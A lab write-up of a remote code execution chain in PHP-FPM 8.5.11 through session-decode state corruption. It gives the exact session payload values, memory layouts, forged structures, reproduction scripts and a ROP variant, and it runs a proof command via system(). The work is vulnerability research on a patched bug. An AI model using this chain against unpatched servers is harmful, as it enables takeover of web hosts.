# PHP-FPM 8.5.11 RCE — session-decode type confusion

Lab finding for PHP 8.5.11 (fixed in 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 by
`31c0ea7d7ff` "Avoid state corruption via bailout"). Reproducer:
`fpm/run_rce_fpm.sh`. Proof: `/tmp/fpmx_proof` contains `uid=33(www-data)`.

## 1. Summary

A single `php-fpm` worker, serialized by `pm.max_children = 1`, is driven by two
FastCGI requests:

- **A (groom):** a 24 KB allocation, then `session_start()` on a 1.1 MB
  session file under `memory_limit=4M`, hits an OOM bailout inside the
  serializer decode. The
  bailout skips `php_var_unserialize_destroy()`, leaving
  `BG(unserialize).level = 1` and `BG(unserialize).data` pointing at the freed
  `php_unserialize_data`.
- **B (exploit):** an upload-progress multipart body carries 150 copies of an
  8170-byte value. One of those chunks reclaims the freed `php_unserialize_data`
  region. The next decode (`php_session_rfc1867_update()` →
  `php_session_initialize()` → the `php` serializer) takes the reuse branch of
  `php_var_unserialize_init()` and therefore uses the forged `d` that now sits
  at fill offset `0xFE8`.

The session file then writes three HashTable fields through the
`var_tmp_var()` signed-index primitive:

| write | target | value |
|---|---|---|
| 1 | `HT->arData` | fake bucket array at `d+0xE00` |
| 2 | `HT->nTableSize` | `256` |
| 3 | `HT->pDestructor` | `zif_system` |

On teardown the session array is destroyed; `zend_hash_destroy()` calls
`pDestructor(&bucket->val)`. Bucket 0's value *is* a forged
`zend_execute_data`, so `zif_system()` parses `num_args = 1` and one string
argument at `+0x50`, and runs `system("id > /tmp/fpmx_proof")` as the FPM user.

## 2. Affected code

| file | role |
|---|---|
| `ext/session/session.c:3132` | `php_session_rfc1867_update()`: initialize, `SEPARATE_ARRAY`, `zend_hash_update`, flush |
| `ext/session/session.c:431` | `php_session_initialize()`: `track_init`, `s_read`, decode |
| `ext/session/session.c:1063` | `PS_SERIALIZER_DECODE_FUNC(php)`: pipe format, `var_tmp_var()` + `php_set_session_var()` |
| `ext/standard/var_unserializer.c:62` | `php_var_unserialize_init()`: dangling `BG(unserialize).data` reuse when `level != 0` |
| `ext/standard/var_unserializer.c:87` | `php_var_unserialize_destroy()`: skipped by the bailout |
| `ext/standard/var_unserializer.c:157` | `tmp_var()`: signed `used_slots`, returns `&data[used_slots]` |
| `Zend/zend_hash.c:1733` | `zend_hash_destroy()`: `ht->pDestructor(&p->val)` dtor loop |
| `ext/session/php_session.h:297` | `PS_ENCODE_LOOP`: `php_get_session_var(bucket->key)` per string key |
| `Zend/zend_API.h:2326` | `zend_parse_arg_path_str()`: `ZSTR_LEN != strlen(ZSTR_VAL)` NUL check |
| `ext/standard/exec.c:249` | `zif_system()` → `php_exec_ex()` → `popen()` |

## 3. Write primitive

`tmp_var()` in `ext/standard/var_unserializer.c`:

```c
zend_long used_slots = var_hash->used_slots;      /* attacker-controlled */
for (...) { ZVAL_UNDEF(&var_hash->data[used_slots]); ... }
return &var_hash->data[used_slots];
```

`used_slots` is a *signed* `zend_long` read from the entries block. A negative
value makes the returned zval point before the block:

```
target = entries + 0x10 + 16 * used_slots
```

The decoder then writes the parsed session value there (8-byte value at
`target`, 4-byte type at `target+8`). `var_tmp_var()` also pre-writes
`IS_UNDEF` at `target+8` before parsing, so a failed parse leaves only the type
byte touched.

Because the value is attacker-chosen, each successful session variable is one
arbitrary write of `(8-byte value, type = IS_LONG)`.

### The jump ring

`d->last_dtor` starts at `E0` and `var_tmp_var()` advances `E0->used_slots` by
one per variable, so the write target advances by 16 each time. A variable
whose target is `d+0x10` overwrites `last_dtor` with `E1`, restarting the
target sequence anywhere.

Payload `fpm/payload/sess_T`:

```
a|i:140737324486712;   d+0x38   keep `last` valid
b|i:140737324488968;   E1       jump: last_dtor = E1
c|i:140737324490240;   HT+0x10  arData = d+0xE00
d|i:256;               HT+0x20  nTableSize = 256
e|i:93824997188512;    HT+0x30  pDestructor = zif_system
```

The last value needs its terminating `;` so the decode returns SUCCESS. On
success the serializer calls `php_var_unserialize_destroy()` with the context
already at level 1 (from the groom), so it only decrements the level (2 -> 1)
and leaves the forged `d` in place. Variable `a` also clobbers the low dword of
`first_dtor`; that is harmless because `var_destroy()` is never reached on this
path.

## 4. Memory layout

`setarch -R`, PIE base `0x555555400000`, filler `fpm/payload/fillU.bin`
(8170 bytes; addresses are the deterministic lab values):

| address / offset | content |
|---|---|
| `0x555555a0e3a0` | `zif_system` (vaddr `0x60e3a0`) |
| `0x7ffff63b9000` (`d`) | forged `php_unserialize_data` (fill offset `0xFE8`) |
| `0x7ffff625c2d8` (`HT`) | session array HashTable |
| `d+0x800` (`E0`) | entries block: `used_slots = -129` |
| `d+0x908` (`E1`) | entries block: `used_slots = -89443` |
| `d+0xDC0` | 64 empty hash slots (`0xFF`), `nTableMask = -16` |
| `d+0xE00` | fake `arData` / bucket 0 = forged `execute_data` |
| `d+0xF00` | fake `zend_string` for the command |
| `d+0xF2C` | NUL terminator at `val[len]` |

The frame at `d+0xE00`:

| offset | field | value |
|---|---|---|
| `0x00` | `opline` | `0` |
| `0x08` | `call` | `1` |
| `0x10` | `return_value` | `0` |
| `0x18` | `func` | `0` |
| `0x28` | `This.type_info` | `0` |
| `0x2C` | `This.u2.num_args` | `1` |
| `0x50` | arg0 value | `d+0xF00` |
| `0x58` | arg0 type | `d+0xF06` |

## 5. Why the four non-obvious fields matter

- **`nTableMask = -16`.** The empty-slot array is 64 bytes at `arData-64`, not
  32. Leaving the upper half as `0x41` bytes makes the upload-progress
  `zend_symtable_find()` dereference `0x41414141` as a bucket index.
- **`arg0.type = d+0xF06`.** The same qword is bucket 2's `key` pointer.
  `PS_ENCODE_LOOP` calls `php_get_session_var(bucket->key)` for every string
  key, so the value must be a readable `zend_string` (hash 0 -> empty slot),
  while its low byte stays `0x06` (`IS_STRING`).
- **NUL at `val[len]`.** `Z_PARAM_PATH_STR` checks
  `ZSTR_LEN != strlen(ZSTR_VAL)`; without the terminator `strlen` scans into
  the surrounding fill and the argument is rejected.
- **gdb `follow-fork-mode parent` at `popen`.** Only for `MODE=gdb`: the
  debugger otherwise follows the shell child and blocks the command. The
  default no-gdb mode does not need this.

## 6. Reproduction

```bash
cd ~/php2shell
bash fpm/run_rce_fpm.sh          # MODE=nogdb: setarch -R php-fpm -F
MODE=gdb bash fpm/run_rce_fpm.sh # same chain under the tracing probe
```

The script creates the FPM container with the `p2s-fpm-8511` network alias
(the nginx upstream in `fpm/nginx-8511.conf` is hardcoded to that name), so the
groom request and the exploit request hit the same single worker. It copies
`payload/sess_A` and `payload/sess_T`, sends the groom through nginx and the
exploit through FastCGI, then prints `/tmp/fpmx_proof`.

Expected output:

```
RCE proof (/tmp/fpmx_proof):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The worker SIGSEGVs after the proof (the forged `execute_data`'s NULL
`return_value` write and the `efree()` of the forged `arData`), and FPM
respawns it.

## 7. Constraints

- The original lab ran under `setarch -R`. The native chain uses the
  app-visible leak (Round 36/37) for `d` and the PIE base; `HT` is
  `d-0x193CF0` in the leak layout. No debugger writes are needed; see §9.
- The groom relies on `memory_limit` being small enough for the 1.1 MB session
  decode to OOM inside `session_start()`, and on the OOM bailout leaving the
  unserialize context dangling.
- The multipart layout (field count/size) fixes the reclaimed address; any
  change to the request layout shifts `d` and requires rebuilding the payload.
- Of the groom's `pre`/`pad`/`hole` allocations, only `pre=24576` is
  load-bearing in this layout; `pad` and `hole` are unnecessary. 12 KB does not
  prime, 32 KB primes but lands the wrong addresses.
- 8.5.12+ fixes the bailout state corruption and therefore the priming step.

## 8. Genericity: what a stock app must supply

The page is a deterministic composition of three capabilities that a generic
application would have to provide on its own; a virgin default install with no
session injection and no bailout path is not exploitable by this chain.

1. **A decode-time longjmp bailout.** The 4M `ini_set` is one instance. An
   uncaught exception or `Error` in `__wakeup`/`__unserialize` is **not**
   enough: `var_destroy()` continues after the throw and
   `php_var_unserialize_destroy()` still frees `d` and decrements the level
   (`ext/standard/var_unserializer.c:262`, `:84`), so the context is cleaned.
   Real triggers are OOM (an app low limit, or a session file larger than the
   default 128M), `exit()`/`die()`, a fatal error, or a timeout in the magic
   method.
2. **Attacker-controlled session data.** The A request must read a session
   file whose variables are the exploit's addresses. Generic apps call
   `session_start()` often, but the session content is app-written; the
   attacker needs a session-injection/write primitive (or an app that stores
   attacker-chosen keys and values in `$_SESSION`).
3. **A controllable allocation before `session_start()`.** Only the ~24 KB
   `pre` allocation is load-bearing in this layout (verified); an app without a
   user-influenced allocation of the right size, or an attacker groom via the
   session-file size/request fields, will not land `d` where the fill reclaims
   it. Addresses are fixed only because the lab runs under `setarch -R`; a real
   target also needs an address leak.

With multiple workers, the exploit request must additionally reach the primed
worker (the runner uses one; otherwise spray B requests or pin the upstream
connection).


## 9. Native no-gdb chain (Round 37)

`MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native.sh`
returns `uid=33(www-data)` with ASLR on, stock `php.ini-production`, one
worker, no gdb (3/3 runs). The leak pair (Round 36) gives `d` and the PIE base;
the exploit pair installs a fill-resident fake table and frame through the
session decode:

- E0 prelude targets `d-0x30..d+0x00` for p1..p4 and `d+0x10` for p5. p4 is
  `d+0x38` so `d->last` stays a valid entries pointer. p5 writes the E2
  address to `last_dtor`.
- E2 at `d+0xA00` targets `HT+0x10` (arData=`d+0xE80`), `HT+0x20`
  (nTableSize=16), `HT+0x30` (pDestructor=`zif_system`) for p6..p8.
- The array has five elements before p6, so the p6..p8 inserts append to
  buckets 5..7 and leave the frame in buckets 0..2.
- Fake table at `d+0xE80`: bucket 0 frame (`opline=0/call=1/h=0/key=0`),
  bucket 1 `Z_NEXT=1` (num_args), bucket 2 `h=command string` (`d+0xFB0`),
  `key=d+0x106` (fake `zend_string "c"`, low byte 6 = arg type).
- The first decode's flush/encode iterates the fake table; the destroy at the
  second `php_session_track_init` calls `pDestructor(&bucket0.val)`.
  `probe-noframe.gdb` logs `ZIFENTER rdi=d+0xE80`, `num_args=1`, then
  `php_exec` writes the proof and the worker SIGSEGVs after the command.

The old E1 six-value option-2 layout is superseded: its encoder iterates 7/8
buckets while the fake table has five, and dies in `zend_hash_find`.

## 10. Data-only variant (no forged execute_data)

`ROP_PIVOT.md` §"FPM data-only pivot" documents a second working FPM chain that
replaces the forged `zend_execute_data` + `zif_system` with a `jump_fcontext`
stack pivot and a `popen` ROP chain. It reuses this chain's leak and
E0/E2/fake-table mechanism verbatim; only the fire point and the bucket-0
contents differ. Instead of the teardown destroy (which fires on the
progress-clobbered bucket 0 and so cannot carry the pivot), it forges the
`upload_progress_x` key at bucket 0 and lets the upload-progress
`zend_hash_update` old-value destructor fire the pivot on the clean buffer
before the insert overwrites it. `bash fpm/run_rop_pivot.sh` → `uid=33`, 7/7,
ASLR on, no gdb.

The data-only variant also lands on a multi-worker pool: `bash
fpm/run_rop_pivot_multi.sh` drives a `pm.max_children=4` pool, pinning 3 of the
4 workers (`fpm/pin_fcgi.py`) so the groom A and exploit B share the one free
worker, and reports **6/6 `uid=33`, ASLR on, no gdb**. Same single-shot-per-
worker constraint as the single-worker runner (§7), so the runner recreates the
pool per run; the affinity and reliability analysis, and the re-confirmed
teardown block, are in `ROP_PIVOT.md` §"Multi-worker reliability" and §"The
teardown-destroy obstacle". This makes the §8 genericity note ("otherwise spray
B requests or pin the upstream connection") concrete: pinning is the mechanism,
and it is reliable.

## 11. Stock-config reachability (128M)

Verdict per genericity prop, on `php:8.5.11-fpm` with stock `php.ini-production`
(`memory_limit=128M`, `session.upload_progress.enabled=On`, no `ini_set` memory
override), single worker, `session.save_path` empty (resolves to `/tmp`):

| prop | verdict | basis |
|---|---|---|
| (1) decode-time longjmp OOM bailout | **reachable** | OOM backtrace + `BG(unserialize)` scan |
| dangling-`d` reuse across the A/B pair | **reachable** | B pre-RINIT decode reuses A's `d`, `level 1->2` |
| (2) attacker bytes into `$_SESSION` | **not on stock** | upload-progress writes a fixed-shape array only |
| groom reclaim / fill offsets (prop 3) | **partial** | reuse + reclaim fire; 4M-tuned `fillU.bin` misaligns |

Harness: container `p2s-fpm-stock`, page `www/stock_sess.php` (bare
`session_start()`, no memory override), groom builder `fpm/mk_a_amp.py`,
probes `fpm/probe-stock-oom.gdb` (OOM backtrace + BG state) and
`fpm/probe-trace.gdb` (per-decode `init`/`destroy` with `d`/`level`).

### Prop (1): the 4M `ini_set` is not fundamental, only a file-size reducer

`memory_limit` sets the OOM threshold; the bailout mechanism is identical at any
limit. The array handler in `ext/standard/var_unserializer.re` (8.5.11) sizes
the bucket block up front with the **bailing** allocator:

```
array_init_size(rval, elements);
zend_hash_real_init_mixed(Z_ARRVAL_P(rval));   /* emalloc, longjmp on OOM */
```

`zend_hash_real_init_mixed()` allocates `next_pow2(N) * sizeof(Bucket)` before
the element loop. `IS_FAKE_ELEM_COUNT` only requires `N <= remaining/2`, so the
serialized value needs `~2*N` bytes of filler that are never parsed (the bailout
fires at `real_init` first). `fpm/payload/sess_A_amp128` is a session record
`p|a:2500000:{` + filler, **4.77 MB** on disk; `next_pow2(2500000)=2^22` forces
a ~134 MB bucket allocation. Amplification ~28x; input floor is `N=2097153`
(~4.2 MB, the smallest `N` reaching the `2^22` bucket count). **Inference:** a
gzip/base64 transport would raise the ratio further, but the groom reads from
disk, so wire size is moot (see prop 2).

Observed (`fpm/probe-stock-oom.gdb`, stock 128M, no `ini_set`): `session_start()`
on the 4.77 MB record bails inside the decode:

```
#0  _zend_bailout
#2  zend_error_zstr_at
#4  zend_error_noreturn
#7  zend_hash_real_init_mixed
#9  php_var_unserialize
#13 php_session_start
==> BGscan: data@bg+0x368 == 0x7ffff6290000 (==d), next dword(level)=1
```

`php_var_unserialize_destroy` never fires; `BG(unserialize).level` stays 1 and
`.data` dangles at `d`, exactly as §1. The 8.5.12 fix makes this allocation
*fallible* (`array_finit_size_mixed` returns FAILURE instead of longjmp), which
is what closes the bailout window; on 8.5.11 the allocation bails. Confirmed on
the plain (non-gdb) worker: with the 5 MB file verified present, request A
returns 500 with no `STARTED`, and FPM keeps the worker.

### Reuse still occurs at 128M (A/B pair)

The dangling state is memory-limit-independent. A's RSHUTDOWN `memset` of
`BG(unserialize)` (`ext/standard/basic_functions.c:499`) is skipped on the
bailout, and B's upload-progress decode runs in `php_hash_environment()` before
Basic's RINIT `memset` (`:395`). Traced A (stock amp file) + B (multipart
upload-progress, `fpm/fcgi_split.py`) at stock 128M:

```
A: init -> d=0x7ffff6290000  level=1   [FRESH];  BAILOUT level=1 data=d
B: init enter  BG.data=0x7ffff6290000 level=1  ->  d=0x7ffff6290000 level=2  [REUSE]
```

B's pre-RINIT `php_var_unserialize_init()` takes the reuse branch and returns
A's freed `d`. **A plain GET that calls `session_start()` in the script does not
reuse** (it runs after RINIT, which already zeroed the globals); the reuse is
specific to the upload-progress pre-RINIT path.

### Prop (3) groom/offsets: reclaim fires, 4M payload misaligns

The freed-`d` region is reclaimed at 128M, but the `fillU.bin` content baked for
the 4M layout (deterministic `d=0x7ffff63b9000` under `setarch -R`) does not land
its forged header on the shifted 128M `d`. Reading `d[0:0x20]` at B's reuse:

```
4M   (works): d=0x7ffff6280000  last_dtor=0x7ffff63b9800   (== fillU.bin header)
128M (stock): d=0x7ffff6290000  last=0x7ffff6004141  last_dtor=0x7ffff6293000
```

The 4.77 MB session read buffer shifts `d` by 0x10000 versus the 1.1 MB 4M file,
and the reclaiming chunk lands misaligned (`0x4141` = raw `A` filler, not the
forged `var_dtor_entries` pointer). So the write primitive does not arm and B
crashes without the proof. This is the known "offsets tuned at 4M" limitation,
not a new barrier: the native leak-driven chain (§9, `mk_native_fill.py`)
rebuilds `fillU.bin` from the observed `d`, and the same rebuild would retune the
128M layout. **Verdict: partial** (primitive intact, weaponization needs retune).

### Prop (2): attacker-chosen session bytes need an app write primitive

Not reachable on a bare default install. The only stock mechanism that writes a
session file is `session.upload_progress`, whose entry is a fixed-shape array
built in `ext/session/session.c:3306-3334`: `start_time`, `content_length`,
`bytes_processed`, `done` (server-computed longs/bool) and a `files[]` array
whose only attacker strings are `field_name` and the uploaded `name`. Those
serialize as `s:len:"..."`; the attacker cannot emit a declared-huge-count array
(`a:2500000:{`, the groom) or raw pointer records (`i:<addr>;`, the exploit
session). `session.use_strict_mode=0` lets the attacker pick the session id but
not the file content, and the upload-progress payload is itself bounded well
under 128M by `post_max_size=8M` / `max_file_uploads=20`. Seeding either the
groom or the forged `sess_T` therefore requires an app-side session-write
primitive (an app storing attacker-chosen keys/values/serialized data in
`$_SESSION`, or a file-write sink such as the lab's `www/fpm_sess_raw.php`).

### Net

On a stock 128M install the **engine bug is fully reachable without the 4M
crutch**: input amplification alone drives the decode-time OOM, the bailout
leaves the dangling context, and the upload-progress A/B pair reuses it. What a
bare default install does **not** give the attacker is prop (2), getting chosen
serialized bytes into a session file, and a matched groom (prop 3) for ASLR-off
addresses. Both are application/target properties, not engine behavior, so the
honest end-to-end verdict is unchanged from §8: the chain needs app-side session
injection (and, on a real target, an address leak + retuned fill); the OOM-
bailout and dangling-reuse halves of the primitive need neither the 4M `ini_set`
nor any non-default ini.
